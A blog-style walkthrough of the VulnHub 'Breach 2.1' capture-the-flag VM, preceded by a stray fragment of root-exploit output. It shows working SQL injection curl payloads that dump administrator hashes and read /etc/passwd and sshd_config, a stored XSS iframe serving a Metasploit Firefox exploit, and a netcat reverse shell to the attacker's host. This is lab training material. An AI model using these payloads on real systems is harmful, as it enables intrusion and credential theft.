<span class="o">[</span>~] <span class="k">done</span>, fake stack mmapped
<span class="o">[</span>.] executing payload ffffffff8104510a
<span class="o">[</span>~] <span class="k">done</span>, should be root now
<span class="o">[</span>.] checking <span class="k">if </span>we got root
<span class="o">[</span>+] got r00t ^_^
root@Initech-DMZ01:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Breach 2.1</h1>
	<p class="post-date text-bold text-upcase">
	<span>September 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is a boot2root/CTF challenge which attempts to showcase a real-world scenario, with plenty of twists and trolls along the way.</p>

<p><strong>Author:</strong> mrb3n</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/breach-21,159/">https://www.vulnhub.com/entry/breach-21,159/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<p>The VM is configured with a static IP (192.168.110.151) so you’ll need to configure your host only adaptor to this subnet, so I add an IP address to the vmnet1 interface.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ip addr add 192.168.110.150/24 dev vmnet1
root@kali:~<span class="nv">$ </span>ping <span class="nt">-c</span> 1 192.168.110.151
PING 192.168.110.151 <span class="o">(</span>192.168.110.151<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 192.168.110.151: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>1.18 ms

<span class="nt">---</span> 192.168.110.151 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 1.175/1.175/1.175/0.000 ms
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>I performed a full TCP port scan with nmap and found only three available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">-T5</span> 192.168.110.151 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
111/tcp   open  rpcbind
37497/tcp open  unknown
65535/tcp open  unknown
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>With nmap I performed the version and OS detection, script scanning and traceroute of the TCP open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p111</span>,47429,65535 <span class="nt">-A</span> 192.168.110.151 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39414/udp6  status
|   100024  1          37497/tcp   status
|   100024  1          53307/tcp6  status
|_  100024  1          54898/udp   status
37497/tcp open  status  1 <span class="o">(</span>RPC <span class="c">#100024)</span>
65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 <span class="o">(</span>RSA<span class="o">)</span>
|   256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 3b:4d:56:37:5e:c3:45:75:15:cd:85:00:4f:8b:a8:5e <span class="o">(</span>ED25519<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="ssh-enumeration">SSH Enumeration</h3>

<p>Without having found anything important about the previous scan, I proceeded to enumerate the SSH service.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh root@192.168.110.151 <span class="nt">-p</span> 65535
The authenticity of host <span class="s1">'[192.168.110.151]:65535 ([192.168.110.151]:65535)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:r3uJxHJmvGvDbfvH0Y90EO5UAQNeokBIsxs6eDNpEdU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="o">[</span>192.168.110.151]:65535<span class="s1">' (ECDSA) to the list of known hosts.

#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#                 All connections are monitored and recorded                #
#                     Unauthorized access is encouraged                     #
#             Peter, if that'</span>s you - the password is <span class="k">in </span>the source.         <span class="c">#</span>
<span class="c">#          Also, stop checking your blog all day and enjoy your vacation!   # </span>
<span class="c">#############################################################################</span>
</code></pre></div></div>

<p>In the banner I could see that the Peter user exists and his password is in the source. What source?</p>

<p>After a long time without having results, I tried login with the user peter and the password <strong>inthesource</strong>, this works, but the connection was closed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh peter@192.168.110.151 <span class="nt">-p65535</span>
<span class="c">#############################################################################</span>
<span class="c">#                  Welcome to Initech Cyber Consulting, LLC                 #</span>
<span class="c">#                 All connections are monitored and recorded                #</span>
<span class="c">#                     Unauthorized access is encouraged                     #</span>
<span class="c">#             Peter, if that's you - the password is in the source.         #</span>
<span class="c">#          Also, stop checking your blog all day and enjoy your vacation!   # </span>
<span class="c">#############################################################################</span>
peter@192.168.110.151<span class="s1">'s password: 
Connection to 192.168.110.151 closed.
</span></code></pre></div></div>

<p>What happens here, so I decided to re-scan all TCP ports, and I could see port 80 open.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">-T5</span> <span class="nt">-A</span> 192.168.110.151
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Initech Cyber Consulting, LLC
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>So I decided to interact with the web service and I found a welcome message and an image.</p>

<p><img src="/assets/images/breach2/screenshot-1.png" alt="" /></p>

<p>Then I proceeded to run dirbuster to find hidden files and directories.</p>

<p><img src="/assets/images/breach2/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/breach2/screenshot-3.png" alt="" /></p>

<p>In the results we can see that the blog directory exists, I access it, and redirected me to a blog.</p>

<p><img src="/assets/images/breach2/screenshot-4.png" alt="" /></p>

<p>With searchsploit I looked for known vulnerabilities for BlogPHP it is a simple blog script, includes features such as adding blogs, comments, upload files and more, it is also quite old so I found many vulnerabilities.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit blogphp
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
 Exploit Title                                                               |  Path
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
BlogPHP 1.0 - <span class="s1">'index.php'</span> SQL Injection                                      | php/webapps/27099.txt
BlogPHP 1.2 - Multiple SQL Injections                                        | php/webapps/27117.txt
BlogPHP 2 - <span class="s1">'id'</span> Cross-Site Scripting / SQL Injection                        | php/webapps/5042.txt
BlogPHP 2.0 - <span class="s1">'index.php'</span> Multiple Cross-Site Scripting Vulnerabilities      | php/webapps/31774.txt
BlogPHP 2.0 - Persistent Cross-Site Scripting                                | php/webapps/17640.txt
BlogPHP 2.0 - Privilege Escalation / SQL Injection                           | php/webapps/5909.pl
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="sql-injection">SQL Injection</h3>

<p>I focused in SQL Injection vulnerability, I copied the 5442.txt file to my current directory, and read the specifications to exploit it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/5042.txt
  Exploit: BlogPHP 2 - <span class="s1">'id'</span> Cross-Site Scripting / SQL Injection
      URL: https://www.exploit-db.com/exploits/5042
     Path: /usr/share/exploitdb/exploits/php/webapps/5042.txt
File Type: Perl script text executable

Copied to: /root/breach2.1/5042.txt
</code></pre></div></div>

<p>The SQL statement to exploit that vulnerability doesn’t work, so I proceeded to rebuild the SQL statement and finaly it works.</p>

<p><strong>Listing databases</strong></p>

<p>On the blog database I didn’t find anything, so I focused on <strong>oscommerce</strong> database this looks interesting.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27%20union%20select%200,1,table_schema,3,4%20from%20information_schema.tables%20--%20-'</span> | <span class="nb">tr</span> <span class="s1">'&lt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'br /&gt;\w'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $NF}'</span>
information_schema 
blog 
mysql 
oscommerce 
performance_schema
</code></pre></div></div>

<p><strong>Enumerating tables</strong></p>

<p>There are many tables, but I focused on the <strong>osc_administrators</strong> table.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27%20union%20select%200,1,table_name,3,4%20from%20information_schema.tab
les%20where%20table_schema=%27oscommerce%27--%20-'</span> | <span class="nb">tr</span> <span class="s1">'&lt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'br /&gt;\w'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $NF}'</span>                                                     
osc_address_book                                                                                                                                                    
osc_administrators                                                                                                                                                  
osc_administrators_access                                                                                                                                           
osc_administrators_log                                                                                                                                              
osc_banners                                                                                                                                                         
osc_banners_history                                                                                                                                                 
osc_categories                                                                                                                                                      
osc_categories_description                                                                                                                                          
osc_configuration                                                                                                                                                   
osc_configuration_group                                                                                                                                             
osc_counter
...
</code></pre></div></div>

<p><strong>Enumerating columns</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27%20union%20select%200,1,column_name,3,4%20from%20information_schema.columns%20where%20table_schema=%27oscommerce%27%20and%20table_name=%27osc_administrators%27--%20-'</span> | <span class="nb">tr</span> <span class="s1">'&lt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'br /&gt;\w'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $NF}'</span>
<span class="nb">id 
</span>user_name 
user_password 
</code></pre></div></div>

<p><strong>Retrieving users</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27%20union%20select%200,1,concat%28user_name,0x3a,user_password%29,3,4%20from%20oscommerce.osc_administrators--%20-'</span> | <span class="nb">tr</span> <span class="s1">'&lt;'</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'br /&gt;\w'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"&gt;"</span> <span class="s1">'{print $NF}'</span>
admin:685cef95aa31989f2edae5e055ffd2c9:32
</code></pre></div></div>

<p>In the output we can see that there is only one record, also in the following picture we can see the password for the MD5 hash.</p>

<p><img src="/assets/images/breach2/screenshot-5.png" alt="" /></p>

<p><strong>Enumerating the system users</strong></p>

<p>Listing the system users, I filtered for those who are using a bash shell, to try brute force via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27union%20select%200,1,load_file(%27/etc/passwd%27),3,4%20--%20-'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +14 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-4</span> | <span class="nb">sed</span> <span class="s1">'1 s/&lt;table.*&lt;br \/&gt;\(.*\)/\1/'</span> | <span class="nb">grep</span> <span class="s1">'sh$'</span>
root:x:0:0:root:/root:/bin/bash
peter:x:1000:1000:peter,,,:/home/peter:/bin/bash
milton:x:1002:1002::/home/milton:/bin/bash
</code></pre></div></div>

<p><strong>Enumerating the ssh configuration file</strong></p>

<p>At the bottom of the file configuration we can see that only peter can access via ssh, also in the ForceCommand directive we see that a script called startme is being executed after having logged in.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27union%20select%200,1,load_file(%27/etc/ssh/sshd_config%27),3,4%20--%20-'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +14 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-4</span> | <span class="nb">sed</span> <span class="s1">'1 s/&lt;table.*&lt;br \/&gt;\(.*\)/\1/'</span>
...
UsePAM <span class="nb">yes
</span>AllowUsers peter
ForceCommand /usr/bin/startme
AddressFamily inet
</code></pre></div></div>

<p>To find out that what this script does, I listed the contents of <strong>/usr/bin/startme</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.110.151/blog/index.php?act=page&amp;id=999999999%27union%20select%200,1,load_file(%27/usr/bin/startme%27),3,4%20--%20-'</span> | <span class="nb">tail</span> <span class="nt">-n</span> +14 | <span class="nb">head</span> <span class="nt">-n</span> <span class="nt">-4</span> | <span class="nb">sed</span> <span class="s1">'1 s/&lt;table.*&lt;br \/&gt;\(.*\)/\1/'</span>
<span class="c">#!/bin/bash</span>

<span class="nb">sudo</span> /etc/init.d/apache2 start &amp;&gt; /dev/null
</code></pre></div></div>

<p>This script is starting the apache server after peter has logged in.</p>

<p>With SQL Injection vulnerability I cannot find a way to run system commands, so I decided research more and try with the Stored Cross Site Scripting, since I could realize that in the image of the home page was writed beef, so I tried with that.</p>

<h3 id="stored-cross-siste-scripting">Stored Cross Siste Scripting</h3>

<p>I copied the 17640.txt file to my current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/17640.txt
  Exploit: BlogPHP 2.0 - Persistent Cross-Site Scripting
      URL: https://www.exploit-db.com/exploits/17640
     Path: /usr/share/exploitdb/exploits/php/webapps/17640.txt
File Type: UTF-8 Unicode text, with CRLF line terminators

Copied to: /root/breach2.1/17640.txt
</code></pre></div></div>

<p>In the instructions it indicates that in the register section the field username is vulnerable, also the victim has to request the members module to trigger the malicious instruction, so I put the following payload, this will try to connect to my machine listening on port 4343.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"http://192.168.110.150:4343"</span>/&gt;
</code></pre></div></div>

<p><img src="/assets/images/breach2/screenshot-6.png" alt="" /></p>

<p>Then we need to start a netcat listener and wait for the target visit the page (in this case a script) and execute our malicious instruction.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 4343
listening on <span class="o">[</span>any] 4343 ...
connect to <span class="o">[</span>192.168.110.150] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.151] 33045
GET / HTTP/1.1
Host: 192.168.110.150:4343
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:15.0<span class="o">)</span> Gecko/20100101 Firefox/15.0
Accept: image/png,image/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Language: en-us,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Connection: keep-alive
Referer: http://192.168.110.151/blog/members.html
</code></pre></div></div>

<p>We have captured the request header, in the User-Agent field we see to perform the request version 15 of firefox was used, googling I found that this is vulnerable to code execution due to improper exception handling on objects that dont have the exposedProps property set, it is possible to overwrite functions that get called from a privileged context and silently invoke the AddonManager to install a malicious plugin.</p>

<p>There is a metasploit exploit for this, so launch metasploit and set up it as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfconsole <span class="nt">-qx</span> <span class="s2">"use exploit/multi/browser/firefox_proto_crmfrequest; </span><span class="se">\</span><span class="s2">
dquote&gt; set srvhost 192.168.110.150; </span><span class="se">\ </span><span class="s2">         
dquote&gt; set srvport 8888; </span><span class="se">\ </span><span class="s2">                               
dquote&gt; set lhost 192.168.110.150; </span><span class="se">\ </span><span class="s2">                      
dquote&gt; run"</span>                                                    
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp  
srvhost <span class="o">=&gt;</span> 192.168.110.150                                       
srvport <span class="o">=&gt;</span> 8888                                             
lhost <span class="o">=&gt;</span> 192.168.110.150                                      
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit running as background job 0.                   
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit completed, but no session was created.              
                                                                     
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 192.168.110.150:4444          
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using URL: http://192.168.110.150:8888/Xqndzuz                
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server started. 
</code></pre></div></div>

<p>As we can see this created a URL containing the malicious instruction, I tried to create the payload with other HTML tags but it didn’t work except with iframe tag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe <span class="nv">src</span><span class="o">=</span><span class="s2">"http://192.168.110.150:8888/rC9mcJIc"</span> <span class="o">&gt;</span>&lt;/iframe&gt;
</code></pre></div></div>
<p><img src="/assets/images/breach2/screenshot-7.png" alt="" /></p>

<p>Following the same idea we wait a minutes and get a shell with privileges of the user peter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/browser/firefox_proto_crmfrequest<span class="o">)</span> <span class="o">&gt;</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Gathering target information <span class="k">for </span>192.168.110.151           
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending HTML response to 192.168.110.151                                                                           
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending HTML                                                                                                       
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending the malicious addon                                                                                        
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>192.168.110.150:4444 -&gt; 192.168.110.151:42386<span class="o">)</span> at 2021-09-11 23:04:53 <span class="nt">-0500</span>                                                     
                                                                                                                                                                    
msf6 exploit<span class="o">(</span>multi/browser/firefox_proto_crmfrequest<span class="o">)</span> <span class="o">&gt;</span> sessions <span class="nt">-i</span> 1
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting interaction with 1...

<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>peter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>peter<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>peter<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,111<span class="o">(</span>scanner<span class="o">)</span>,115<span class="o">(</span>bluetooth<span class="o">)</span>,1003<span class="o">(</span>fishermen<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151 - Command shell session 1 closed.
</code></pre></div></div>

<p>We have an unstable shell so I decided to switch to a netcat reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/browser/firefox_proto_crmfrequest<span class="o">)</span> <span class="o">&gt;</span> 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Gathering target information <span class="k">for </span>192.168.110.151
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending HTML response to 192.168.110.151
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending HTML
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.110.151  firefox_proto_crmfrequest - Sending the malicious addon
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 2 opened <span class="o">(</span>192.168.110.150:4444 -&gt; 192.168.110.151:42411<span class="o">)</span> at 2021-09-11 23:12:50 <span class="nt">-0500</span>

msf6 exploit<span class="o">(</span>multi/browser/firefox_proto_crmfrequest<span class="o">)</span> <span class="o">&gt;</span> sessions <span class="nt">-i</span> 2
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting interaction with 2...

nc 192.168.110.150 443 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>

<p>I upgraded to a full TTY shell, and I could see the script that visits the blog every 4 minutes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.110.150] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.110.151] 34017
script <span class="nt">-qc</span> /bin/bash /dev/null
peter@breach2:~<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-vlnp</span> 443
root@kali:~<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443

peter@breach2:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>screen
peter@breach2:~<span class="nv">$ </span><span class="nb">stty </span>rows 39 columns 164
peter@breach2:~<span class="nv">$ </span><span class="nb">ls
</span>Desktop  Documents  Downloads  firefox.sh  Music  Pictures  Public  Templates  Videos
peter@breach2:~<span class="nv">$ </span><span class="nb">cat </span>firefox.sh 
<span class="c">#!/bin/bash</span>

xvfb-run <span class="nt">--auto-servernum</span> <span class="nt">--server-num</span><span class="o">=</span>1 /opt/firefox/firefox http://192.168.110.151/blog/members.html
peter@breach2:~<span class="nv">$ </span>crontab <span class="nt">-l</span>
...
<span class="k">*</span>/4 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="nb">cd</span> /home/peter <span class="o">&amp;&amp;</span> ./firefox.sh
</code></pre></div></div>

<p>Then I list the services running and found a service enabled on port 2323.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:~<span class="nv">$ </span>ss <span class="nt">-antl</span>
State      Recv-Q Send-Q          Local Address:Port            Peer Address:Port
LISTEN     0      128                         <span class="k">*</span>:65535                      <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      128                         <span class="k">*</span>:57640                      <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      50                  127.0.0.1:3306                       <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      128                         <span class="k">*</span>:111                        <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      64                  127.0.0.1:2323                       <span class="k">*</span>:<span class="k">*</span>
LISTEN     0      128                        :::49547                     :::<span class="k">*</span>
LISTEN     0      128                        :::111                       :::<span class="k">*</span>
LISTEN     0      128                        :::80                        :::<span class="k">*</span>
</code></pre></div></div>

<p>I connected to that service and found the coordinates of a place, and a log in.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:~<span class="nv">$ </span>telnet 127.0.0.1 2323
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
29 45<span class="s1">'46" N 95 22'</span>59<span class="s2">" W 
breach2 login: ^CConnection closed by foreign host.
</span></code></pre></div></div>

<p>I searched on google maps and found references of a place located in Houston, after a several attempts of login I discovered that the user is milton and the password is Houston, but there is another problem, ask us, whose stapler is it?</p>

<p><img src="/assets/images/breach2/screenshot-8.png" alt="" /></p>

<p>So I proceed to find for milton readable files and filter for the string stapler.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:~<span class="nv">$ </span>find / <span class="nt">-readable</span> <span class="nt">-user</span> milton <span class="nt">-type</span> f 2&gt;/dev/null | xargs <span class="nb">grep </span>stapler
/usr/local/bin/cd.py:   question <span class="o">=</span> raw_input<span class="o">(</span><span class="s2">"Whose stapler is it?"</span><span class="o">)</span>
peter@breach2:~<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/cd.py
<span class="c">#!/usr/bin/python</span>

import signal
import <span class="nb">time
</span>import os

s <span class="o">=</span> signal.signal<span class="o">(</span>signal.SIGINT, signal.SIG_IGN<span class="o">)</span>

<span class="nv">countdown</span><span class="o">=</span>3

<span class="k">while </span>countdown <span class="o">&gt;</span>0:
        time.sleep<span class="o">(</span>1<span class="o">)</span>
        print<span class="o">(</span>countdown<span class="o">)</span>
        countdown -<span class="o">=</span>1
<span class="k">if </span>countdown &lt;1:
        question <span class="o">=</span> raw_input<span class="o">(</span><span class="s2">"Whose stapler is it?"</span><span class="o">)</span>
<span class="k">if </span>question <span class="o">==</span> <span class="s2">"mine"</span>:
        os.system<span class="o">(</span><span class="s2">"echo 'Woot!'"</span><span class="o">)</span>
<span class="k">else</span>:

        os.system<span class="o">(</span><span class="s2">"kill -9 %d"</span>%<span class="o">(</span>os.getppid<span class="o">()))</span>
        signal.signal<span class="o">(</span>signal.SIGINT, s<span class="o">)</span>
</code></pre></div></div>

<p>I found a python script with the same question, and whose answer is mine, so I logged in and was switched to user milton.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>peter@breach2:~<span class="nv">$ </span>telnet 127.0.0.1 2323  
Trying 127.0.0.1...                        
Connected to 127.0.0.1.                     
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>                                 
29 45<span class="s1">'46" N 95 22'</span>59<span class="s2">" W                              
breach2 login: milton                                    
Password:                                                       
Last login: Wed Jul 20 21:04:18 EDT 2016 from localhost on pts/0       
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46"</span> N 95 22<span class="s1">'59" W                                               
3
2
1
Whose stapler is it?mine
Woot!
milton@breach2:~$ id
uid=1002(milton) gid=1002(milton) groups=1002(milton)
</span></code></pre></div></div>

<p>listing the processes, I could see that the nginx server is running as root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>milton@breach2:~<span class="nv">$ </span>ps aux | <span class="nb">grep </span>nginx
root      1423  0.0  0.5  91184  3008 ?        Ss   14:14   0:00 nginx: master process /usr/sbin/nginx <span class="nt">-g</span> daemon on<span class="p">;</span> master_process on<span class="p">;</span>
root      1424  0.0  0.7  91492  3664 ?        S    14:14   0:00 nginx: worker process                           
root      1425  0.0  0.7  91492  3664 ?        S    14:14   0:00 nginx: worker process                           
root      1426  0.0  0.8  91492  4524 ?        S    14:14   0:00 nginx: worker process                           
root      1427  0.0  0.8  91832  4524 ?        S    14:14   0:00 nginx: worker process                           
